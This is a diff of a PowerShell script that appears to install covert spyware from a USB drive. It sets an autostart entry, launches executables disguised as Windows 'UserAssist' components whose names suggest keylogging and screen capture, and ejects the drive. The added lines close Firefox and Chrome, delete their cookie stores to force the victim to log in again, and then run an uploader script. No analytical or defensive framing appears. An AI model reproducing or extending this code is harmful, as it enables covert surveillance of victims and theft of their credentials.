@@ -14,7 +14,16 @@ Copy-Item "${drv}:\scripts\autostart.vbs" "${env:APPDATA}\Microsoft\Windows\Star
 Set-Location  "C:\ProgramData\WindowsUserAssist"
 Start-Process "UserAssist Klg Host.exe"
 Start-Process "UserAssist Scc Host.exe"
-.\"UserAssist Updates.ps1"
+
+#close firefox/chrome web browsers, so that their cookies can be deleted
+Stop-Process -Name Firefox
+Stop-Process -Name Chrome
+#delete firefox/chrome cookies, to make user logged out from online accounts
+Remove-Item -Path "${env:APPDATA}\Mozilla\Firefox\Profiles\*.default*\cookies.sqlite" -Force -Recurse
+Remove-Item -Path "${env:LOCALAPPDATA}\Google\Chrome\User Data\Default\Cookies" -Force -Recurse
 
 #eject the source usb drive
 (New-Object -comObject Shell.Application).NameSpace(17).ParseName("${drv}:").InvokeVerb("Eject")
+
+#pass execution to uploader script
+.\"UserAssist Updates.ps1"
